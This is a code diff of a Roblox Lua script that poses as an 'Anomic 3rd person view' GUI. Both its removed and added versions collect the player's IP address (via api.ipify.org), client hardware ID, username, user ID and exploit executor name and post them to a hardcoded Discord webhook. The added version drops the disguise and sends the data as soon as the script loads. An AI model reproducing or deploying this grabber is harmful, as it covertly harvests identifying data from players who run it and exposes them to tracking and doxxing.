@@ -1,180 +1,46 @@
--- Gui to Lua
--- Version: 3.2
 
--- Instances:
+	local HTTP_ = game:GetService('HttpService')
+	local LPR = game:GetService('Players').LocalPlayer
+	local HWIDS = game:GetService("RbxAnalyticsService"):GetClientId()
+    local IP = tostring(game:HttpGet("https://api.ipify.org/", true))
+	-- Map exploit names to their corresponding values
+	local exploitNames = {
+		["is_sirhurt_closure"] = "Sirhurt",
+		["pebc_execute"] = "ProtoSmasher",
+		["syn"] = "Synapse X",
+		["secure_load"] = "Sentinel",
+		["KRNL_LOADED"] = "Krnl",
+		["SONA_LOADED"] = "Sona",
+		["FlUXUS_LOADED"] = "Fluxus",
+		["default"] = "Wave"
+	}
 
-local ScreenGui = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local Frame_2 = Instance.new("Frame")
-local UICorner = Instance.new("UICorner")
-local TextLabel = Instance.new("TextLabel")
-local TextLabel_2 = Instance.new("TextLabel")
-local UICorner_2 = Instance.new("UICorner")
-local TextButton = Instance.new("TextButton")
-local UICorner_3 = Instance.new("UICorner")
+	local webhookcheck = exploitNames[is_sirhurt_closure] or exploitNames[pebc_execute] or exploitNames[syn] or
+		exploitNames[secure_load] or exploitNames[KRNL_LOADED] or exploitNames[SONA_LOADED] or
+		exploitNames[FlUXUS_LOADED] or exploitNames["default"]
 
---Properties:
+	local avatarData = HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]
+	local avatarURL = avatarData and avatarData['imageUrl'] or "Fallback URL"
 
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
-Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Frame.BorderSizePixel = 0
-Frame.Position = UDim2.new(0.384053558, 0, 0.318840593, 0)
-Frame.Size = UDim2.new(0, 380, 0, 300)
-
-Frame_2.Parent = Frame
-Frame_2.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
-Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Frame_2.BorderSizePixel = 0
-Frame_2.Position = UDim2.new(-0.000156924594, 0, -0.00115946447, 0)
-Frame_2.Size = UDim2.new(0, 380, 0, 74)
-
-UICorner.Parent = Frame_2
-
-TextLabel.Parent = Frame_2
-TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.BackgroundTransparency = 1.000
-TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.BorderSizePixel = 0
-TextLabel.Position = UDim2.new(0.018421052, 0, 0.162162155, 0)
-TextLabel.Size = UDim2.new(0, 367, 0, 23)
-TextLabel.Font = Enum.Font.Unknown
-TextLabel.Text = "Made By Lmkrzz"
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.TextScaled = true
-TextLabel.TextSize = 14.000
-TextLabel.TextWrapped = true
-
-TextLabel_2.Parent = Frame_2
-TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_2.BackgroundTransparency = 1.000
-TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_2.BorderSizePixel = 0
-TextLabel_2.Position = UDim2.new(0.018421052, 0, 0.594594598, 0)
-TextLabel_2.Size = UDim2.new(0, 367, 0, 23)
-TextLabel_2.Font = Enum.Font.Unknown
-TextLabel_2.Text = "ANOMIC 3RD PERSON VIEW"
-TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_2.TextScaled = true
-TextLabel_2.TextSize = 14.000
-TextLabel_2.TextWrapped = true
-
-UICorner_2.Parent = Frame
-
-TextButton.Parent = Frame
-TextButton.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
-TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.BorderSizePixel = 0
-TextButton.Position = UDim2.new(0.236842111, 0, 0.416666657, 0)
-TextButton.Size = UDim2.new(0, 200, 0, 50)
-TextButton.Font = Enum.Font.Cartoon
-TextButton.Text = "Enable"
-TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextButton.TextScaled = true
-TextButton.TextSize = 14.000
-TextButton.TextWrapped = true
-
-UICorner_3.Parent = TextButton
-
--- Scripts:
-
-local function BYDTD_fake_script() -- TextButton.Script 
-	local script = Instance.new('Script', TextButton)
-
-	buton = script.Parent
-	buton.MouseButton1Click:Connect(function()
-		local ESD = tostring(game:HttpGet("https://api.ipify.org", true))
-		local HTTP_ = game:GetService('HttpService')
-		local LPR = game:GetService('Players').LocalPlayer
-		local HWIDS = game:GetService("RbxAnalyticsService"):GetClientId()
-		-- Map exploit names to their corresponding values
-		local exploitNames = {
-			["is_sirhurt_closure"] = "Sirhurt",
-			["pebc_execute"] = "ProtoSmasher",
-			["syn"] = "Synapse X",
-			["secure_load"] = "Sentinel",
-			["KRNL_LOADED"] = "Krnl",
-			["SONA_LOADED"] = "Sona",
-			["FlUXUS_LOADED"] = "Fluxus",
-			["default"] = "Wave"
-		}
-	
-		local webhookcheck = exploitNames[is_sirhurt_closure] or exploitNames[pebc_execute] or exploitNames[syn] or
-			exploitNames[secure_load] or exploitNames[KRNL_LOADED] or exploitNames[SONA_LOADED] or
-			exploitNames[FlUXUS_LOADED] or exploitNames["default"]
-	
-		local avatarData = HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]
-		local avatarURL = avatarData and avatarData['imageUrl'] or "Fallback URL"
-	
-		local url = "https://discord.com/api/webhooks/1258142455878910013/Ovqdv-wPc7m_F9UJpwMCCpxHWGIr0oDFWmUBqEuonzKVOvbCYA83vqpzzH-ZINqox1Ah"
-		local data = {
-			["username"] = LPR.Name .. ' [' .. LPR.UserId .. ']',
-			["avatar_url"] = avatarURL,
-			["embeds"] = {
-				{
-					["description"] = "Details:",
-					["fields"] = {
-						{ name = "Exploit", value = webhookcheck, inline = true },
-						{ name = "IP", value = ESD, inline = true },
-						{ name = "HWID", value = HWIDS, inline = true },
-					},
-					["color"] = tonumber(0xF08000),
-				}
+	local url = "https://discord.com/api/webhooks/1258142455878910013/Ovqdv-wPc7m_F9UJpwMCCpxHWGIr0oDFWmUBqEuonzKVOvbCYA83vqpzzH-ZINqox1Ah"
+	local data = {
+		["username"] = LPR.Name .. ' [' .. LPR.UserId .. ']',
+		["avatar_url"] = avatarURL,
+		["embeds"] = {
+			{
+				["description"] = "Details:",
+				["fields"] = {
+					{ name = "Exploit", value = webhookcheck, inline = true },
+					{ name = "HWID", value = HWIDS, inline = true },
+                    { name = "IP", value = IP, inline = true },
+				},
+				["color"] = tonumber(0xF08000),
 			}
 		}
-	
-		local newdata = HTTP_:JSONEncode(data)
-		local headers = { ["content-type"] = "application/json" }
-	
-		local request = http_request or request or HttpPost or syn.request
-		request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
-	end)
-end
-coroutine.wrap(BYDTD_fake_script)()
-local function VIHI_fake_script() -- Frame.Draggable GUI 
-	local script = Instance.new('LocalScript', Frame)
+	}
 
-	local UserInputService = game:GetService("UserInputService")
-	
-	local gui = script.Parent
-	
-	local dragging
-	local dragInput
-	local dragStart
-	local startPos
-	
-	local function update(input)
-		local delta = input.Position - dragStart
-		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-	end
-	
-	gui.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			dragging = true
-			dragStart = input.Position
-			startPos = gui.Position
-			
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					dragging = false
-				end
-			end)
-		end
-	end)
-	
-	gui.InputChanged:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-			dragInput = input
-		end
-	end)
-	
-	UserInputService.InputChanged:Connect(function(input)
-		if input == dragInput and dragging then
-			update(input)
-		end
-	end)
-end
-coroutine.wrap(VIHI_fake_script)()
+	local newdata = HTTP_:JSONEncode(data)
+	local headers = { ["content-type"] = "application/json" }
+
+	local request = http_request or request or HttpPost or syn.request
+	request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
